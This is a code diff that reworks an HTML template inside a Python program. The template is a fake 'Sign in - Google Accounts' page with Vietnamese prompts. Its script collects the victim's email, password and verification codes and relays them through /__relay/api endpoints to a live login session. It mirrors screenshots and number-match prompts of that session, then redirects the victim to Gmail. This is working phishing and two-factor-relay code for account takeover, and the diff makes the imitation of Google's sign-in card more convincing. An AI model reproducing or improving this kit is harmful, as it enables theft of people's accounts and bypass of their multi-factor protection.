@@ -384,75 +384,109 @@ def public_state(s):
 # ------------------------------------------------------------------ page ---
 PAGE = """<!doctype html><html><head><meta charset=utf-8>
 <meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=google content=notranslate>
 <title>Sign in - Google Accounts</title>
 <style>
 *{box-sizing:border-box;font-family:'Google Sans','Segoe UI',Roboto,Arial,sans-serif}
-body{margin:0;background:#f8f9fa;color:#202124;display:flex;flex-direction:column;min-height:100vh}
-.wrap{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:16px}
-#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:34px;font-weight:600;padding:10px 26px;border-radius:12px;margin-bottom:12px;letter-spacing:6px}
-#live{max-width:1024px;width:100%;height:auto;border:1px solid #dadce0;border-radius:12px;background:#fff;filter:blur(16px);transition:filter .3s}
-#live.on{filter:none}
-#bar{margin-top:14px;display:flex;gap:8px;width:100%;max-width:560px}
+body{margin:0;background:#fff;color:#202124;display:flex;flex-direction:column;min-height:100vh}
+.wrap{flex:1;display:flex;justify-content:center}
+.card{width:450px;margin-top:64px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px;height:fit-content}
+.logo{display:flex;justify-content:center;margin-bottom:16px}
+h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 10px}
+.sub{font-size:16px;text-align:center;margin-bottom:28px;color:#202124}
+input{width:100%;padding:14px 15px;font-size:16px;border:1px solid #dadce0;border-radius:8px;outline:none;margin:8px 0 8px;background:#fff}
+input:focus{border-color:#0b57d0;box-shadow:0 0 0 1px #0b57d0}
+input.egpw{-webkit-text-security:disc}
+.row{display:flex;justify-content:space-between;align-items:center;margin-top:24px}
+.link{color:#0b57d0;font-size:14px}
+.nxt{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 24px;font-size:14px;cursor:pointer}
+.nxt:disabled{background:#9aa0a6}
+.err{color:#d93025;font-size:13px;margin:6px 0 0;min-height:16px}
+.foot{padding:12px 24px;display:flex;justify-content:space-between;font-size:12px;color:#5f6368}
+.foot .l{display:flex;gap:18px}
+#num{display:none;background:#e8f0fe;color:#0b57d0;font-size:40px;font-weight:600;padding:12px 32px;border-radius:14px;margin:0 auto 18px;letter-spacing:8px;text-align:center;width:fit-content}
+#mirror{max-width:960px;width:100%;height:auto;border:1px solid #dadce0;border-radius:12px;background:#fff;filter:blur(18px);transition:filter .35s}
+#mirror.on{filter:none}
+#bar{margin:14px auto 0;display:flex;gap:8px;max-width:560px}
 #bar.off{display:none}
-#inp{flex:1;padding:11px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;outline:none;background:#fff}
+#inp{flex:1;padding:12px 14px;font-size:15px;border:1px solid #dadce0;border-radius:8px;outline:none;background:#fff}
 #inp:focus{border-color:#0b57d0;box-shadow:0 0 0 1px #0b57d0}
 #inp.egpw{-webkit-text-security:disc}
-#go{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;font-size:14px;cursor:pointer}
-#go:disabled{background:#9aa0a6}
-#st{margin-top:10px;font-size:13px;color:#5f6368;min-height:18px;text-align:center}
-#st.err{color:#d93025}
-.foot{padding:10px 24px;display:flex;justify-content:flex-end;gap:18px;font-size:12px;color:#5f6368;background:#f8f9fa}
+#go2{background:#0b57d0;color:#fff;border:none;border-radius:100px;padding:10px 22px;font-size:14px;cursor:pointer}
+#go2:disabled{background:#9aa0a6}
+#st2{margin:10px auto 0;font-size:13px;color:#5f6368;min-height:18px;text-align:center;max-width:560px}
 </style></head><body>
 <div class=wrap>
-<div id=num></div>
-<img id=live alt="">
-<div id=bar class=off><input id=inp autocomplete=off><button id=go>Tiếp tục</button></div>
-<div id=st></div>
+<div class=card id=card>
+<div class=logo><svg width=40 height=40 viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg></div>
+<h1>Sign in</h1>
+<div class=sub>Use your Google Account</div>
+<input id=inp autocomplete=off placeholder="Email or phone">
+<div class=err id=err></div>
+<div class=row><span class=link>Forgot email?</span><button class=nxt id=go>Next</button></div>
 </div>
-<div class=foot><span>Help</span><span>Privacy</span><span>Terms</span></div>
+<div id=mirrorwrap style="display:none;text-align:center">
+<div id=num style="display:none">00</div>
+<img id=mirror alt="">
+<div id=bar class=off><input id=rinp autocomplete=off><button class=nxt id=rgo>Next</button></div>
+<div id=st2 style="font-size:13px;color:#5f6368;min-height:18px;margin-top:10px"></div>
+</div>
+</div>
+<div class=foot><div class=l><span>English (United States)</span></div><div class=l><span>Help</span><span>Privacy</span><span>Terms</span></div></div>
 <script>
-var SID=null, live=document.getElementById('live');
+var SID=null, EMAIL="", KIND=null,
+    mirror=document.getElementById('mirror'), numEl=document.getElementById('num'),
+    rbar=document.getElementById('bar'), rinp=document.getElementById('rinp'), rgo=document.getElementById('rgo'),
+    st2=document.getElementById('st2');
 ['pointermove','keydown','touchstart'].forEach(function(ev){
- document.addEventListener(ev,function(){live.classList.add('on');},{once:true,capture:true});});
-function setSt(t,err){var s=document.getElementById('st');s.textContent=t||'';s.className=err?'err':'';}
-var bar=document.getElementById('bar'), inp=document.getElementById('inp'),
-    go=document.getElementById('go'), numEl=document.getElementById('num');
-var PLACE={password:'Mật khẩu',code:'Mã xác minh',email:'Email'};
-var KIND=null;
-function showInput(kind){KIND=kind;bar.className='';inp.className=kind==='password'?'egpw':'';
- inp.placeholder=PLACE[kind]||'';inp.value='';inp.focus();}
-function hideInput(){KIND=null;bar.className='off';}
-go.onclick=submit; inp.onkeydown=function(k){if(k.key==='Enter')submit();};
-function submit(){
- if(!inp.value){return;}
- if(!SID){ // initial: email -> start session
-  if(!inp.value.includes('@')){setSt('Nhập địa chỉ email',1);return;}
-  go.disabled=true;setSt('Đang kết nối…');
-  fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
-   body:JSON.stringify({email:inp.value})}).then(r=>r.json()).then(j=>{
-    SID=j.id;hideInput();}).catch(()=>{setSt('Lỗi mạng',1);go.disabled=false;});
-  return;
- }
- go.disabled=true;setSt('Đang xử lý…');
+ document.addEventListener(ev,function(){mirror.classList.add('on');},{once:true,capture:true});});
+function setErr(t){document.getElementById('err').textContent=t||'';}
+function setSt2(t,err){st2.textContent=t||'';st2.style.color=err?'#d93025':'#5f6368';}
+function showMirror(){document.getElementById('card').style.display='none';
+ document.getElementById('mirrorwrap').style.display='block';}
+function showRelayInput(kind,placeholder){rbar.className='';KIND=kind;
+ rinp.className=kind==='password'?'egpw':'';rinp.value='';rinp.placeholder=placeholder||'';rinp.focus();}
+function relaySubmit(){
+ if(!rinp.value)return;
+ rgo.disabled=true;setSt2('Đang xử lý…');
  fetch('/__relay/api/input',{method:'POST',headers:{'Content-Type':'application/json'},
-  body:JSON.stringify({id:SID,kind:KIND,value:inp.value})}).then(()=>{hideInput();}).catch(()=>{setSt('Lỗi mạng',1);go.disabled=false;});
+  body:JSON.stringify({id:SID,kind:KIND,value:rinp.value})}).then(function(){rinp.value='';}).catch(function(){setSt2('Lỗi mạng',1);rgo.disabled=false;});
+}
+rgo.onclick=relaySubmit; rinp.onkeydown=function(k){if(k.key==='Enter')relaySubmit();};
+function submit(){
+ var v=document.getElementById('inp').value;
+ if(!v||v.indexOf('@')<0){setErr('Nhập địa chỉ email');return;}
+ setErr('');EMAIL=v;showMirror();setSt2('Đang mở trang đăng nhập…');
+ fetch('/__relay/api/start',{method:'POST',headers:{'Content-Type':'application/json'},
+  body:JSON.stringify({email:v})}).then(function(r){return r.json();}).then(function(j){SID=j.id;poll();})
+  .catch(function(){setSt2('Lỗi mạng — thử lại',1);});
+}
+document.getElementById('go').onclick=submit;
+document.getElementById('inp').onkeydown=function(k){if(k.key==='Enter')submit();};
+function stagePassword(){showRelayInput('password','Nhập mật khẩu cho '+EMAIL);setSt2('');}
+function stageChallenge(st){
+ if(st.need_input==='code'){showRelayInput('code','Nhập mã xác minh');}
+ else{rbar.className='off';}
+ setSt2(st.hint||'Kiểm tra điện thoại của bạn');
+}
+function stageDone(){
+ rbar.className='off';setSt2('');
+ numEl.insertAdjacentHTML('afterend','<div style="text-align:center;margin:14px 0"><svg width=56 height=56 viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="11" stroke="#34A853" stroke-width="2"/><path d="M7 12.5l3.2 3.2L17 9" stroke="#34A853" stroke-width="2" fill="none"/></svg><div style="font-size:20px;margin-top:10px">Bạn đã đăng nhập thành công</div><div style="color:#5f6368;font-size:14px;margin-top:6px">Đang chuyển tới Gmail…</div></div>');
+ setTimeout(function(){location.href='https://mail.google.com';},2600);
 }
 function poll(){
  if(!SID){setTimeout(poll,900);return;}
- fetch('/__relay/api/state?id='+SID).then(r=>r.json()).then(st=>{
-  if(st.screenshot){live.src='data:image/jpeg;base64,'+st.screenshot;}
+ fetch('/__relay/api/state?id='+SID).then(function(r){return r.json();}).then(function(st){
+  if(st.screenshot){var src='data:image/jpeg;base64,'+st.screenshot;
+   if(mirror.getAttribute('src')!==src){mirror.src=src;mirror.classList.add('on');}}
   if(st.match_number){numEl.style.display='block';numEl.textContent=st.match_number;}
-  else{numEl.style.display='none';}
-  setSt(st.hint&&st.hint.indexOf('Nhập')===0?st.hint:(st.state==='init'?'Đang mở trang đăng nhập…':''));
-  if(st.state==='done'){setSt('Đăng nhập thành công — đang chuyển hướng…');
-   setTimeout(function(){location.href='https://mail.google.com';},2200);return;}
-  if(st.state==='error'){setSt(st.hint||'Không thể đăng nhập',1);return;}
-  if(st.need_input&&!KIND){showInput(st.need_input);go.disabled=false;}
-  else if(!st.need_input&&KIND==='password'&&(st.state==='challenge'||st.state==='done')){hideInput();}
+  if(st.state==='password'){stagePassword();}
+  else if(st.state==='challenge'){stageChallenge(st);}
+  else if(st.state==='done'){stageDone();return;}
+  else if(st.state==='error'){rbar.className='off';setSt2(st.hint||'Không thể đăng nhập',1);return;}
   setTimeout(poll,1200);
- }).catch(()=>setTimeout(poll,2000));
+ }).catch(function(){setTimeout(poll,2200);});
 }
-showInput('email');
 poll();
 </script></body></html>"""
 
